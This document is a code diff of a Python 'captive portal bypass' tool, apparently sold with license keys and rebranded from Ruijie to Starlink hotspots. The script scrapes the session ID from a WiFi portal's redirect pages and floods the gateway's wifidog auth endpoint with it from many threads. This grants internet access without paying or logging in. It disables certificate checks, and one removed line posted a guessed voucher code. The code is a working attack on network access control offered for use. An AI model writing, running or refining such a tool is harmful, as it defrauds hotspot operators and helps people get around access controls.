@@ -4,10 +4,10 @@ import re
 import urllib3
 import time
 import threading
-import logging
 import random
 import uuid
 import sys
+from datetime import datetime # ရက်စွဲစစ်ရန် ထည့်ထားသည်
 from urllib.parse import urlparse, parse_qs, urljoin
 from colorama import Fore, Back, Style, init
 
@@ -18,18 +18,11 @@ init(autoreset=True)
 # ===============================
 # LICENSE CONFIG
 # ===============================
-# ပြောင်းလဲလိုက်သော Link အသစ်
-GITHUB_URL = "https://raw.githubusercontent.com/Zyan091/my-database/refs/heads/main/zayan.py"
+GITHUB_URL = "https://raw.githubusercontent.com/Zyan091/my-database/main/key.txt"
 KEY_FILE = os.path.join(os.path.expanduser("~"), ".device_key")
 
-# ===============================
-# BYPASS CONFIG
-# ===============================
-PING_THREADS = 5
-MIN_INTERVAL = 0.05
-MAX_INTERVAL = 0.2
+PING_THREADS = 10
 DEBUG = False
-
 stop_event = threading.Event()
 
 # ===============================
@@ -47,21 +40,21 @@ def get_or_create_key():
 
 def check_real_internet():
     try:
-        return requests.get("http://www.google.com", timeout=3).status_code == 200
+        return requests.get("http://connectivitycheck.gstatic.com/generate_204", timeout=3).status_code == 204
     except:
         return False
 
 def h_banner():
     os.system('clear')
     print(f"{Fore.MAGENTA}{'='*55}")
-    print(f"{Fore.CYAN}  █████╗ ██╗      █████╗ ██████╗ ██████╗ ██╗███╗   ██╗")
-    print(f"{Fore.CYAN} ██╔══██╗██║     ██╔══██╗██╔══██╗██╔══██╗██║████╗  ██║")
-    print(f"{Fore.CYAN} ███████║██║     ███████║██║  ██║██║  ██║██║██╔██╗ ██║")
-    print(f"{Fore.CYAN} ██╔══██║██║     ██╔══██║██║  ██║██║  ██║██║██║╚██╗██║")
-    print(f"{Fore.CYAN} ██║  ██║███████╗██║  ██║██████╔╝██████╔╝██║██║ ╚████║")
-    print(f"{Fore.CYAN} ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═════╝ ╚═════╝ ╚═╝╚═╝  ╚═══╝")
+    print(f"{Fore.CYAN}   █████╗ ██╗      █████╗ ██████╗ ██████╗ ██╗███╗   ██╗")
+    print(f"{Fore.CYAN}  ██╔══██╗██║     ██╔══██╗██╔══██╗██╔══██╗██║████╗  ██║")
+    print(f"{Fore.CYAN}  ███████║██║     ███████║██║  ██║██║  ██║██║██╔██╗ ██║")
+    print(f"{Fore.CYAN}  ██╔══██║██║     ██╔══██║██║  ██║██║  ██║██║██║╚██╗██║")
+    print(f"{Fore.CYAN}  ██║  ██║███████╗██║  ██║██████╔╝██████╔╝██║██║ ╚████║")
+    print(f"{Fore.CYAN}  ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═════╝ ╚═════╝ ╚═╝╚═╝  ╚═══╝")
     print(f"{Fore.MAGENTA}{'='*55}")
-    print(f"{Fore.WHITE}{Back.BLUE}      RUIJIE BYPASS PRO v2.0 | OWNER: ALADDIN STAR     ")
+    print(f"{Fore.WHITE}{Back.BLUE}      STARLINK BYPASS ULTRA | OWNER: ALLI STAR       ")
     print(f"{Style.RESET_ALL}{Fore.MAGENTA}{'='*55}\n")
 
 # ===============================
@@ -71,34 +64,29 @@ def high_speed_ping(auth_link, sid):
     session = requests.Session()
     while not stop_event.is_set():
         try:
-            session.get(auth_link, timeout=5)
-            print(f"{Fore.GREEN}[✓]{Fore.RESET} SID {sid} | Turbo Pulse Active     ", end="\r")
+            session.get(auth_link, timeout=5, verify=False)
+            print(f"{Fore.GREEN}[✓]{Fore.RESET} SID {sid[:8]} | Turbo Active     ", end="\r")
         except:
-            print(f"{Fore.RED}[X]{Fore.RESET} Connection Lost...               ", end="\r")
             break
-        time.sleep(random.uniform(MIN_INTERVAL, MAX_INTERVAL))
+        time.sleep(random.uniform(0.01, 0.1))
 
 def start_bypass_process():
-    logging.info(f"{Fore.CYAN}Initializing Turbo Engine...{Fore.RESET}")
-
+    print(f"{Fore.CYAN}[*] Starting Bypass Engine...{Fore.RESET}")
     while not stop_event.is_set():
         session = requests.Session()
-        test_url = "http://connectivitycheck.gstatic.com/generate_204"
-
         try:
-            r = requests.get(test_url, allow_redirects=True, timeout=5)
-
-            if r.url == test_url:
+            r = requests.get("http://connectivitycheck.gstatic.com/generate_204", allow_redirects=True, timeout=5)
+            if r.url == "http://connectivitycheck.gstatic.com/generate_204":
                 if check_real_internet():
-                    print(f"{Fore.YELLOW}[•]{Fore.RESET} Internet Already Active... Waiting     ", end="\r")
-                    time.sleep(5)
+                    print(f"{Fore.YELLOW}[•]{Fore.RESET} Internet Active... Monitoring      ", end="\r")
+                    time.sleep(10)
                     continue
 
             portal_url = r.url
             parsed_portal = urlparse(portal_url)
             portal_host = f"{parsed_portal.scheme}://{parsed_portal.netloc}"
 
-            print(f"\n{Fore.CYAN}[*] Captive Portal Detected{Fore.RESET}")
+            print(f"\n{Fore.CYAN}[*] Portal Detected: {portal_host}")
 
             r1 = session.get(portal_url, verify=False, timeout=10)
             path_match = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r1.text)
@@ -107,43 +95,33 @@ def start_bypass_process():
 
             sid = parse_qs(urlparse(r2.url).query).get('sessionId', [None])[0]
             if not sid:
-                sid_match = re.search(r'sessionId=([a-zA-Z0-9]+)', r2.text)
+                sid_match = re.search(r'sessionId=([a-zA-Z0-9\-]+)', r2.text)
                 sid = sid_match.group(1) if sid_match else None
 
-if not sid:
-                logging.warning(f"{Fore.RED}Session ID Not Found{Fore.RESET}")
+            if not sid:
+                print(f"{Fore.RED}[!] SID not found. Check Starlink connection.")
                 time.sleep(5)
                 continue
 
-            print(f"{Fore.GREEN}[✓]{Fore.RESET} Session ID Captured: {sid}")
-
-            # Optional Voucher Test
-            voucher_api = f"{portal_host}/api/auth/voucher/"
-            try:
-                session.post(voucher_api, json={'accessCode': '123456', 'sessionId': sid, 'apiVersion': 1}, timeout=5)
-            except:
-                pass
-
+            print(f"{Fore.GREEN}[✓] Session Captured: {sid}")
+            
             params = parse_qs(parsed_portal.query)
             gw_addr = params.get('gw_address', ['192.168.60.1'])[0]
             gw_port = params.get('gw_port', ['2060'])[0]
-
-            auth_link = f"http://{gw_addr}:{gw_port}/wifidog/auth?token={sid}&phonenumber=12345"
-            print(f"{Fore.MAGENTA}[*] Launching {PING_THREADS} Turbo Threads...{Fore.RESET}")
+            auth_link = f"http://{gw_addr}:{gw_port}/wifidog/auth?token={sid}"
 
             for _ in range(PING_THREADS):
                 threading.Thread(target=high_speed_ping, args=(auth_link, sid), daemon=True).start()
 
             while check_real_internet():
-                time.sleep(5)
+                time.sleep(10)
 
         except Exception as e:
-            if DEBUG:
-                logging.error(f"{Fore.RED}Error: {e}{Fore.RESET}")
+            if DEBUG: print(f"Error: {e}")
             time.sleep(5)
 
 # ===============================
-# LICENSE VERIFICATION
+# LICENSE VERIFICATION (EXP SYSTEM INCLUDED)
 # ===============================
 def verify_license():
     h_banner()
@@ -157,30 +135,54 @@ def verify_license():
         if response.status_code == 200:
             lines = response.text.splitlines()
             for line in lines:
-                if "|" in line:
-                    key, status = line.split("|")
-                    if key == user_key:
-                        if status.strip().upper() == "ACTIVE":
-                            print(f"{Fore.CYAN}[+] Status Check: {Fore.BLACK}{Back.GREEN} ACTIVE ")
-                            print(f"{Fore.GREEN}✅ Access Granted! Launching Engine...")
-                            time.sleep(1)
-                            return True
+                if user_key in line:
+                    parts = line.split("|")
+                    if len(parts) >= 3:
+                        key_id = parts[0].strip()
+                        status = parts[1].strip().upper()
+                        exp_date_str = parts[2].strip()
+                        
+                        # ရက်စွဲစစ်ဆေးခြင်း
+                        today = datetime.now().date()
+                        try:
+                            exp_date = datetime.strptime(exp_date_str, "%Y-%m-%d").date()
+                        except:
+                            print(f"{Fore.RED}❌ DATE FORMAT ERROR (Use YYYY-MM-DD)")
+                            return False
+
+                        if status == "ACTIVE":
+                            if today <= exp_date:
+                                print(f"{Fore.CYAN}[+] Status: {Fore.BLACK}{Back.GREEN} ACTIVE ")
+                                print(f"{Fore.YELLOW}[i] Expire: {Fore.WHITE}{exp_date_str}")
+                                print(f"{Fore.GREEN}✅ Access Granted!")
+                                time.sleep(1.5)
+                                return True
+                            else:
+                                print(f"{Fore.RED}[!] Status: {Fore.BLACK}{Back.RED} EXPIRED ")
+                                print(f"{Fore.YELLOW}[*] Your access ended on {exp_date_str}")
+                                return False
                         else:
-                            print(f"{Fore.RED}[!] Status Check: {Fore.BLACK}{Back.RED} BANNED ")
-                            sys.exit()
-            print(f"{Fore.RED}❌ ERROR: KEY NOT REGISTERED")
-            sys.exit()
-    except:
-        print(f"{Fore.RED}❌ ERROR: SERVER UNREACHABLE")
-        sys.exit()
+                            print(f"{Fore.RED}[!] Status: BANNED / INACTIVE")
+                            return False
+            
+            print(f"{Fore.RED}❌ KEY NOT REGISTERED")
+            print(f"{Fore.YELLOW}Please add '{user_key}|ACTIVE|2026-12-31' to GitHub.")
+            return False
+        else:
+            print(f"{Fore.RED}❌ Server Error: {response.status_code}")
+            return False
+    except Exception as e:
+        print(f"{Fore.RED}❌ Connection Lost! Check Internet.")
+        return False
 
 # ===============================
-# ENTRY POINT
+# MAIN
 # ===============================
-if name == "main":
+if __name__ == "__main__":
     try:
         if verify_license():
             start_bypass_process()
     except KeyboardInterrupt:
         stop_event.set()
-        print(f"\n{Fore.RED}Turbo Engine Shutdown...{Fore.RESET}")              
+        print(f"\n{Fore.RED}Shutdown Engine...{Fore.RESET}")
+            
